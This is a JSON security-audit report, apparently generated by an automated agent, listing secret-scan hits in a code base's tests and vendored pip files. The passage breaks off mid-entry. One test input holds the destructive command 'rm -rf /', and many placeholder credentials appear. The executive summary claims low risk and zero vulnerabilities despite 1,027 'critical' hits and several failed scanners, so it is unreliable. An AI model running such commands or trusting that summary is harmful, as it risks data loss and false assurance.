{
  "audit_metadata": {
    "agent_id": "AGENT_4",
    "audit_type": "COMPREHENSIVE_SECURITY_ARCHITECTURE_AUDIT",
    "timestamp": "2025-06-08T19:40:43.536799",
    "version": "1.0.0",
    "classification": "CONFIDENTIAL"
  },
  "executive_summary": {
    "overall_security_posture": "LOW_RISK",
    "critical_vulnerabilities": 0,
    "high_risk_vulnerabilities": 0,
    "medium_risk_vulnerabilities": 0,
    "recommendation": "MONITORING_RECOMMENDED",
    "estimated_remediation_time": "1 week"
  },
  "detailed_findings": {
    "static_analysis": {
      "bandit_scan": {
        "status": "error",
        "error": "[Errno 2] No such file or directory: 'bandit'"
      },
      "semgrep_scan": {
        "status": "skipped",
        "reason": "Semgrep not installed or available"
      },
      "dependency_scan": {
        "pip_audit": {
          "status": "failed",
          "reason": "pip-audit not available"
        },
        "npm_audit": {
          "status": "completed",
          "total_vulnerabilities": 0,
          "critical": 0,
          "high": 0,
          "file": "agent4_npm_audit.json"
        },
        "cargo_audit": {
          "status": "completed",
          "vulnerabilities": 3,
          "file": "agent4_cargo_audit.json"
        }
      },
      "secret_scan": {
        "status": "completed",
        "total_secrets_found": 1027,
        "critical_secrets": 1027,
        "findings": [
          {
            "file": "test_all_mcp_servers_parallel.py",
            "type": "aws_keys",
            "line": 117,
            "severity": "CRITICAL",
            "context": "ACK_BOT_TOKEN', 'test_slack_token'),\n            'AWS_ACCESS_KEY_ID': os.getenv('AWS_ACCESS_KEY_ID', 'test_aws_key'),"
          },
          {
            "file": "test_all_mcp_servers_parallel.py",
            "type": "aws_keys",
            "line": 117,
            "severity": "CRITICAL",
            "context": "en'),\n            'AWS_ACCESS_KEY_ID': os.getenv('AWS_ACCESS_KEY_ID', 'test_aws_key'),\n            'AWS_SECRET_ACCESS"
          },
          {
            "file": "test_all_mcp_servers_parallel.py",
            "type": "aws_keys",
            "line": 118,
            "severity": "CRITICAL",
            "context": "AWS_ACCESS_KEY_ID', 'test_aws_key'),\n            'AWS_SECRET_ACCESS_KEY': os.getenv('AWS_SECRET_ACCESS_KEY', 'test_aws_se"
          },
          {
            "file": "test_all_mcp_servers_parallel.py",
            "type": "aws_keys",
            "line": 118,
            "severity": "CRITICAL",
            "context": ",\n            'AWS_SECRET_ACCESS_KEY': os.getenv('AWS_SECRET_ACCESS_KEY', 'test_aws_secret'),\n            'AZURE_DEVOPS_T"
          },
          {
            "file": "bash_god_deployment.py",
            "type": "passwords",
            "line": 234,
            "severity": "CRITICAL",
            "context": "nt\": [\n                        \"GF_SECURITY_ADMIN_PASSWORD=admin123\"\n                    ],\n                    \"volum"
          },
          {
            "file": "test_rbac_direct.py",
            "type": "passwords",
            "line": 132,
            "severity": "CRITICAL",
            "context": "ator\",\n        email=\"alice@company.com\",\n        password=\"SecurePassword123!\"\n    )\n    print(f\"\u2705 Created user: {user.username}"
          },
          {
            "file": "test_rbac_direct.py",
            "type": "passwords",
            "line": 137,
            "severity": "CRITICAL",
            "context": ")\n    \n    # Test password verification\n    valid_password = user.verify_password(\"SecurePassword123!\")\n    invalid_password = user.v"
          },
          {
            "file": "test_rbac_direct.py",
            "type": "passwords",
            "line": 138,
            "severity": "CRITICAL",
            "context": "verify_password(\"SecurePassword123!\")\n    invalid_password = user.verify_password(\"wrongpassword\")\n    print(f\"\u2705 Password verificatio"
          },
          {
            "file": "test_rbac_core.py",
            "type": "passwords",
            "line": 94,
            "severity": "CRITICAL",
            "context": "tuser\",\n        email=\"test@example.com\",\n        password=\"SecurePass123!\"\n    )\n    print(f\"\u2705 Created user: {user.username}"
          },
          {
            "file": "test_mcp_comprehensive.py",
            "type": "aws_keys",
            "line": 99,
            "severity": "CRITICAL",
            "context": "ACK_BOT_TOKEN', 'test_slack_token'),\n            'AWS_ACCESS_KEY_ID': os.getenv('AWS_ACCESS_KEY_ID', 'test_aws_key'),"
          },
          {
            "file": "test_mcp_comprehensive.py",
            "type": "aws_keys",
            "line": 99,
            "severity": "CRITICAL",
            "context": "en'),\n            'AWS_ACCESS_KEY_ID': os.getenv('AWS_ACCESS_KEY_ID', 'test_aws_key'),\n            'AWS_SECRET_ACCESS"
          },
          {
            "file": "test_mcp_comprehensive.py",
            "type": "aws_keys",
            "line": 100,
            "severity": "CRITICAL",
            "context": "AWS_ACCESS_KEY_ID', 'test_aws_key'),\n            'AWS_SECRET_ACCESS_KEY': os.getenv('AWS_SECRET_ACCESS_KEY', 'test_aws_se"
          },
          {
            "file": "test_mcp_comprehensive.py",
            "type": "aws_keys",
            "line": 100,
            "severity": "CRITICAL",
            "context": ",\n            'AWS_SECRET_ACCESS_KEY': os.getenv('AWS_SECRET_ACCESS_KEY', 'test_aws_secret'),\n            'AZURE_DEVOPS_T"
          },
          {
            "file": "test_log_injection_prevention.py",
            "type": "passwords",
            "line": 112,
            "severity": "CRITICAL",
            "context": "levels...\")\n    \n    test_input = \"User: admin\\r\\nPassword: secret123\\nCommand: rm -rf /\"\n    \n    # Test all levels\n    for leve"
          },
          {
            "file": "test_mcp_security_integration.py",
            "type": "passwords",
            "line": 113,
            "severity": "CRITICAL",
            "context": "= {\n    host: 'localhost',\n    user: 'admin',\n    password: 'admin123',  // Hardcoded\n    database: 'myapp'\n};\n\n// Comma"
          },
          {
            "file": "test_mcp_security_integration.py",
            "type": "database_urls",
            "line": 74,
            "severity": "CRITICAL",
            "context": "rdcoded secret\nAPI_KEY = \"sk_live_abcd1234567890\"\nDATABASE_URL = \"postgresql://user:secret123@localhost/db\"\n\n# Weak crypto\nimport hashlib\npassword_hash = has"
          },
          {
            "file": "test_rbac_standalone.py",
            "type": "passwords",
            "line": 280,
            "severity": "CRITICAL",
            "context": "           email=\"alice@company.com\", \n           password=\"SecurePass123!\",\n           roles=[\"operator\"]\n       )\n   )\n   \n"
          },
          {
            "file": "test_rbac_standalone.py",
            "type": "passwords",
            "line": 288,
            "severity": "CRITICAL",
            "context": "r\"].authenticate(\n       username=\"alice\",\n       password=\"SecurePass123!\"\n   )\n   \n   # Check permissions\n   can_deploy = a"
          },
          {
            "file": "test_mcp_security_comprehensive.py",
            "type": "passwords",
            "line": 290,
            "severity": "CRITICAL",
            "context": "\n        \n        # Test password hashing\n        password = \"test_password_123\"\n        hashed = security_core.encryption.hash_pa"
          },
          {
            "file": "test_mcp_security_comprehensive.py",
            "type": "passwords",
            "line": 556,
            "severity": "CRITICAL",
            "context": "file.write_text(\"\"\"\n# Security issues for testing\npassword = \"hardcoded123\"  # Hardcoded password\nquery = \"SELECT * FROM user"
          },
          {
            "file": "test_mcp_security_comprehensive.py",
            "type": "passwords",
            "line": 639,
            "severity": "CRITICAL",
            "context": "         (project_path / \"app.py\").write_text(\"\"\"\npassword = \"secret123\"\n            \"\"\")\n            \n            results"
          },
          {
            "file": "comprehensive_module_test_suite.py",
            "type": "database_urls",
            "line": 241,
            "severity": "CRITICAL",
            "context": "     # Test 2: Database URL configuration\n        db_url = os.getenv(\"DATABASE_URL\", \"sqlite:///./test_db.sqlite\")\n     "
          },
          {
            "file": "test_rbac_system.py",
            "type": "passwords",
            "line": 227,
            "severity": "CRITICAL",
            "context": "hndoe\",\n        email=\"john@example.com\",\n        password=\"SecurePass123!\",\n        roles=[\"operator\"]\n    )\n    \n    user ="
          },
          {
            "file": "test_rbac_system.py",
            "type": "passwords",
            "line": 239,
            "severity": "CRITICAL",
            "context": "authenticate(\n        username=\"johndoe\",\n        password=\"SecurePass123!\",\n        ip_address=\"127.0.0.1\"\n    )\n    print(f"
          },
          {
            "file": "test_rbac_system.py",
            "type": "passwords",
            "line": 249,
            "severity": "CRITICAL",
            "context": "ge_password(\n        user_id=user.id,\n        old_password=\"SecurePass123!\",\n        new_password=\"NewSecurePass456!\"\n    )\n "
          },
          {
            "file": "test_rbac_system.py",
            "type": "passwords",
            "line": 250,
            "severity": "CRITICAL",
            "context": "       old_password=\"SecurePass123!\",\n        new_password=\"NewSecurePass456!\"\n    )\n    print(f\"\u2705 Changed password successfully"
          },
          {
            "file": "test_rbac_system.py",
            "type": "passwords",
            "line": 396,
            "severity": "CRITICAL",
            "context": "ktest\",\n        email=\"lock@example.com\",\n        password=\"ValidPass123!\"\n    )\n    user = await user_manager.create_user(u"
          },
          {
            "file": "test_rbac_system.py",
            "type": "passwords",
            "line": 443,
            "severity": "CRITICAL",
            "context": "lice\",\n        email=\"alice@company.com\",\n        password=\"AliceSecure123!\",\n        roles=[\"operator\"]\n    )\n    alice = awa"
          },
          {
            "file": "test_rbac_system.py",
            "type": "passwords",
            "line": 452,
            "severity": "CRITICAL",
            "context": "r.authenticate(\n        username=\"alice\",\n        password=\"AliceSecure123!\",\n        ip_address=\"192.168.1.100\"\n    )\n    pri"
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "type": "passwords",
            "line": 431,
            "severity": "CRITICAL",
            "context": "      credentials_file.write_text(\"\"\"\n            password = \"super_secret_password_123\"\n            GITHUB_TOKEN = ghp_1234567890abcdefgh"
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "type": "tokens",
            "line": 434,
            "severity": "CRITICAL",
            "context": "ESS_KEY_ID = AKIAIOSFODNN7EXAMPLE\n            jwt_token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test.signature\n            high_entropy_string = "
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "type": "aws_keys",
            "line": 433,
            "severity": "CRITICAL",
            "context": "_1234567890abcdefghijklmnopqrstuvwxyz\n            AWS_ACCESS_KEY_ID = AKIAIOSFODNN7EXAMPLE\n            jwt_token = ey"
          },
          {
            "file": "test_rbac_simple.py",
            "type": "passwords",
            "line": 37,
            "severity": "CRITICAL",
            "context": "ord verification test:\")\n    print(f\"   - Correct password: {admin.verify_password('AdminPass123!')}\")\n    print(f\"   - Wrong password"
          },
          {
            "file": "test_rbac_simple.py",
            "type": "passwords",
            "line": 38,
            "severity": "CRITICAL",
            "context": "ssword('AdminPass123!')}\")\n    print(f\"   - Wrong password: {admin.verify_password('WrongPassword')}\")\n    \n    # Test failed login tr"
          },
          {
            "file": "deploy_parallel_10_agents.py",
            "type": "aws_keys",
            "line": 239,
            "severity": "CRITICAL",
            "context": "ACK_BOT_TOKEN': 'dummy_slack_token',\n            'AWS_ACCESS_KEY_ID': 'dummy_aws_key',\n            'AWS_SECRET_ACCESS"
          },
          {
            "file": "deploy_parallel_10_agents.py",
            "type": "aws_keys",
            "line": 240,
            "severity": "CRITICAL",
            "context": "AWS_ACCESS_KEY_ID': 'dummy_aws_key',\n            'AWS_SECRET_ACCESS_KEY': 'dummy_aws_secret',\n            'AZURE_DEVOPS_T"
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "type": "passwords",
            "line": 100,
            "severity": "CRITICAL",
            "context": "'AKIAIOSFODNN7EXAMPLE';\n                    const password = 'admin123!@#';\n                \"\"\"\n            },\n            \""
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "type": "passwords",
            "line": 141,
            "severity": "CRITICAL",
            "context": "   # Hardcoded credentials\n                    DB_PASSWORD = 'root@123'\n                    SECRET_KEY = 'my-secret-key-1"
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "type": "passwords",
            "line": 165,
            "severity": "CRITICAL",
            "context": "               user: root\n                        password: admin123\n                        \n                    aws:"
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "type": "private_keys",
            "line": 211,
            "severity": "CRITICAL",
            "context": "                \"\"\",\n                \"id_rsa\": \"\"\"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAtest1234567890abcdefghijklmnopqrs"
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "type": "database_urls",
            "line": 205,
            "severity": "CRITICAL",
            "context": "{\n                \".env\": \"\"\"\n                    DATABASE_URL=postgres://user:password@localhost/db\n                    JWT_SECRET=your-256-bit-secre"
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "type": "aws_keys",
            "line": 208,
            "severity": "CRITICAL",
            "context": "ghijklmnopqrstuvwxyz123456789\n                    AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n                    AWS_SECR"
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "type": "aws_keys",
            "line": 209,
            "severity": "CRITICAL",
            "context": "S_KEY_ID=AKIAIOSFODNN7EXAMPLE\n                    AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n        "
          },
          {
            "file": "test_mcp_servers_simplified.py",
            "type": "aws_keys",
            "line": 102,
            "severity": "CRITICAL",
            "context": "ACK_BOT_TOKEN', 'test_slack_token'),\n            'AWS_ACCESS_KEY_ID': os.getenv('AWS_ACCESS_KEY_ID', 'test_aws_key'),"
          },
          {
            "file": "test_mcp_servers_simplified.py",
            "type": "aws_keys",
            "line": 102,
            "severity": "CRITICAL",
            "context": "en'),\n            'AWS_ACCESS_KEY_ID': os.getenv('AWS_ACCESS_KEY_ID', 'test_aws_key'),\n            'AWS_SECRET_ACCESS"
          },
          {
            "file": "test_mcp_servers_simplified.py",
            "type": "aws_keys",
            "line": 103,
            "severity": "CRITICAL",
            "context": "AWS_ACCESS_KEY_ID', 'test_aws_key'),\n            'AWS_SECRET_ACCESS_KEY': os.getenv('AWS_SECRET_ACCESS_KEY', 'test_aws_se"
          },
          {
            "file": "test_mcp_servers_simplified.py",
            "type": "aws_keys",
            "line": 103,
            "severity": "CRITICAL",
            "context": ",\n            'AWS_SECRET_ACCESS_KEY': os.getenv('AWS_SECRET_ACCESS_KEY', 'test_aws_secret'),\n            'AZURE_DEVOPS_T"
          },
          {
            "file": "full_stack_review.py",
            "type": "aws_keys",
            "line": 377,
            "severity": "CRITICAL",
            "context": "HOOK_URL',\n            'SENTRY_DSN',\n            'AWS_ACCESS_KEY_ID',\n            'AWS_SECRET_ACCESS_KEY',\n          "
          },
          {
            "file": "full_stack_review.py",
            "type": "aws_keys",
            "line": 378,
            "severity": "CRITICAL",
            "context": "N',\n            'AWS_ACCESS_KEY_ID',\n            'AWS_SECRET_ACCESS_KEY',\n            'AZURE_TENANT_ID',\n            'GCP"
          },
          {
            "file": "code-base-crawler/parallel_development_orchestrator.py",
            "type": "passwords",
            "line": 2129,
            "severity": "CRITICAL",
            "context": ":3000\"\n    environment:\n      - GF_SECURITY_ADMIN_PASSWORD=cbc_admin\n    networks:\n      - cbc_network\n\nvolumes:\n  cbc"
          },
          {
            "file": "tests/conftest.py",
            "type": "aws_keys",
            "line": 291,
            "severity": "CRITICAL",
            "context": "  \"SLACK_BOT_TOKEN\": \"test-slack-token\",\n        \"AWS_ACCESS_KEY_ID\": \"test-aws-key\",\n        \"AWS_SECRET_ACCESS_KEY\""
          },
          {
            "file": "tests/conftest.py",
            "type": "aws_keys",
            "line": 292,
            "severity": "CRITICAL",
            "context": "    \"AWS_ACCESS_KEY_ID\": \"test-aws-key\",\n        \"AWS_SECRET_ACCESS_KEY\": \"test-aws-secret\",\n        \"AZURE_DEVOPS_TOKEN\""
          },
          {
            "file": "tests/mcp_security_testing.py",
            "type": "passwords",
            "line": 860,
            "severity": "CRITICAL",
            "context": "    test_params = {\n            \"command\": \"echo 'password=secret123'\",\n            \"description\": \"Logging test with s"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_remediation.py",
            "type": "passwords",
            "line": 45,
            "severity": "CRITICAL",
            "context": "         (r'password\\s*=\\s*[\"\\']([^\"\\']+)[\"\\']', 'password = os.getenv(\"CBC_PASSWORD\", \"\")'),\n            (r'token\\s*=\\s*["
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_remediation.py",
            "type": "passwords",
            "line": 86,
            "severity": "CRITICAL",
            "context": "e-strong-secret-key\nCBC_TOKEN=your-token-here\nCBC_PASSWORD=strong-password-here\n\n# Security Settings\nCBC_TOKEN_EXPIRY=900\nCBC_MAX"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_remediation.py",
            "type": "database_urls",
            "line": 97,
            "severity": "CRITICAL",
            "context": "IES=true\nCBC_CSRF_PROTECTION=true\n\n# Database\nCBC_DATABASE_URL=postgresql://user:password@localhost/cbc\nCBC_DATABASE_POOL_SIZE=10\n\n# Monitoring\nCBC_METRI"
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "type": "passwords",
            "line": 524,
            "severity": "CRITICAL",
            "context": "terns = [\n            (r\"password\\s*[:=]\\s*\\S+\", \"password: [REDACTED]\"),\n            (r\"Bearer\\s+\\S+\", \"Bearer [REDACTED"
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "type": "passwords",
            "line": 270,
            "severity": "CRITICAL",
            "context": "itized)\n            (\"Database connection failed: password=secret123\", \"Database connection failed: [REDACTED-CREDENTIA"
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/error_sanitizer.py",
            "type": "passwords",
            "line": 286,
            "severity": "CRITICAL",
            "context": "[\n        \"Database connection failed: user=admin password=secret123 host=192.168.1.100\",\n        \"File not found: /ho"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 93,
            "severity": "CRITICAL",
            "context": "g password from keyring for %s\", url)\n            password = self.keyring.get_password(url, username)\n            if password:\n              "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 94,
            "severity": "CRITICAL",
            "context": "eyring.get_password(url, username)\n            if password:\n                return username, password\n        return None\n\n    def s"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 120,
            "severity": "CRITICAL",
            "context": "L139\n        if username is not None:\n            password = self._get_password(url, username)\n            if password is not None:\n  "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 339,
            "severity": "CRITICAL",
            "context": "etloc from the url.\n        url, netloc, url_user_password = split_auth_netloc_from_url(\n            original_url,\n        )\n\n        # St"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 344,
            "severity": "CRITICAL",
            "context": "credentials embedded in the url\n        username, password = url_user_password\n        if username is not None and password is n"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 355,
            "severity": "CRITICAL",
            "context": "nfo:\n                index_url, _, index_url_user_password = index_info\n                logger.debug(\"Found index url %s\""
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 360,
            "severity": "CRITICAL",
            "context": "er_password[0] is not None:\n            username, password = index_url_user_password\n            if username is not None and password "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 402,
            "severity": "CRITICAL",
            "context": "t credentials from original url\n        username, password = self._get_new_credentials(original_url)\n\n        # If credentials not found, use any stor"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 421,
            "severity": "CRITICAL",
            "context": "            username = username or \"\"\n            password = password or \"\"\n\n            # Store any acquired credentia"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 437,
            "severity": "CRITICAL",
            "context": "edentials for this request\n        url, username, password = self._get_url_and_credentials(req.url)\n\n        # Set the url of the request to the url "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 462,
            "severity": "CRITICAL",
            "context": "           return auth[0], auth[1], False\n        password = ask_password(\"Password: \")\n        return username, password, Tr"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 485,
            "severity": "CRITICAL",
            "context": "       if self.use_keyring:\n            username, password = self._get_new_credentials(\n                resp.url,\n                allow_n"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 492,
            "severity": "CRITICAL",
            "context": "   if not self.prompting and not username and not password:\n            return resp\n\n        parsed = urllib.parse.urlparse(resp"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 499,
            "severity": "CRITICAL",
            "context": "     save = False\n        if not username and not password:\n            username, password, save = self._prompt_for_password(parsed"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 512,
            "severity": "CRITICAL",
            "context": "           username=username,\n                    password=password,\n                )\n\n        # Consume content and "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 429,
            "severity": "CRITICAL",
            "context": "f make_rev_args(\n        username: Optional[str], password: Optional[HiddenText]\n    ) -> CommandArgs:\n        \"\"\"\n        Return "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 442,
            "severity": "CRITICAL",
            "context": "rev_and_auth(url.secret)\n        username, secret_password = user_pass\n        password: Optional[HiddenText] = None\n   "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 443,
            "severity": "CRITICAL",
            "context": "    username, secret_password = user_pass\n        password: Optional[HiddenText] = None\n        if secret_password is not None:\n  "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 445,
            "severity": "CRITICAL",
            "context": "      if secret_password is not None:\n            password = hide_value(secret_password)\n        extra_args = self.make_rev_args(username,"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
            "type": "passwords",
            "line": 98,
            "severity": "CRITICAL",
            "context": "f make_rev_args(\n        username: Optional[str], password: Optional[HiddenText]\n    ) -> CommandArgs:\n        extra_args: Command"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
            "type": "passwords",
            "line": 103,
            "severity": "CRITICAL",
            "context": "extra_args += [\"--username\", username]\n        if password:\n            extra_args += [\"--password\", password]\n\n        return extra"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
            "type": "passwords",
            "line": 142,
            "severity": "CRITICAL",
            "context": "  keyfile: _StrOrBytesPath | None = None,\n        password: _PasswordType | None = None,\n    ) -> None:\n        return self"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
            "type": "passwords",
            "line": 145,
            "severity": "CRITICAL",
            "context": "(\n            certfile=certfile, keyfile=keyfile, password=password\n        )\n\n    def load_default_certs(\n        se"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
            "type": "passwords",
            "line": 843,
            "severity": "CRITICAL",
            "context": "name = prefix\n        else:\n            username, password = prefix.split(':', 1)\n    if username:\n        username = unquote"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
            "type": "passwords",
            "line": 846,
            "severity": "CRITICAL",
            "context": "name:\n        username = unquote(username)\n    if password:\n        password = unquote(password)\n    return username, password"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
            "type": "passwords",
            "line": 83,
            "severity": "CRITICAL",
            "context": " self.username = cfg.get('username')\n        self.password = cfg.get('password')\n        self.realm = cfg.get('realm', '"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 320,
            "severity": "CRITICAL",
            "context": "      self.cert_file = cert_file\n        self.key_password = key_password\n        self.ssl_context = ssl_context\n        se"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 354,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.assert_hostname = assert_hostname\n  "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 423,
            "severity": "CRITICAL",
            "context": "         certfile=self.cert_file,\n            key_password=self.key_password,\n            ca_certs=self.ca_certs,\n            c"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 967,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.ca_certs = ca_certs\n        self.ca_"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 983,
            "severity": "CRITICAL",
            "context": "      key_file=self.key_file,\n                key_password=self.key_password,\n                cert_file=self.cert_file,\n       "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 1039,
            "severity": "CRITICAL",
            "context": "          key_file=self.key_file,\n            key_password=self.key_password,\n            **self.conn_kw\n        )\n\n        ret"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 53,
            "severity": "CRITICAL",
            "context": "   category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(userna"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 60,
            "severity": "CRITICAL",
            "context": "tin1\")\n\n    if isinstance(password, str):\n        password = password.encode(\"latin1\")\n\n    authstr = \"Basic \" + to_native_strin"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 81,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all("
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 112,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
            "type": "passwords",
            "line": 323,
            "severity": "CRITICAL",
            "context": "thorization\"]\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, pa"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
            "type": "passwords",
            "line": 329,
            "severity": "CRITICAL",
            "context": "f not scheme.startswith('https') and username and password:\n            headers[\"Proxy-Authorization\"] = _basic_auth_str(username, "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 214,
            "severity": "CRITICAL",
            "context": "ower().startswith(\"socks\"):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] ="
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 218,
            "severity": "CRITICAL",
            "context": "               username=username,\n                password=password,\n                num_pools=self._pool_connections,"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 427,
            "severity": "CRITICAL",
            "context": "       \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers[\"Proxy-"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 69,
            "severity": "CRITICAL",
            "context": "r)\n            else prompt\n        )\n        self.password = password\n        if choices is not None:\n            self."
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 136,
            "severity": "CRITICAL",
            "context": " prompt,\n            console=console,\n            password=password,\n            choices=choices,\n            show_def"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 203,
            "severity": "CRITICAL",
            "context": "\n        \"\"\"\n        return console.input(prompt, password=password, stream=stream)\n\n    def check_choice(self, value:"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
